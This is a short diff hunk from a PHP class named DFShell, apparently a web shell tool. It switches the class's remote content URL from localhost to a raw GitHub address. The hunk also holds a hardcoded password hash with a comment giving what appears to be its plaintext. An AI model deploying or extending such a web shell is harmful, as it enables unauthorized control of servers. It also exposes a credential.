@@ -50,7 +50,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "http://localhost/css";
+    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
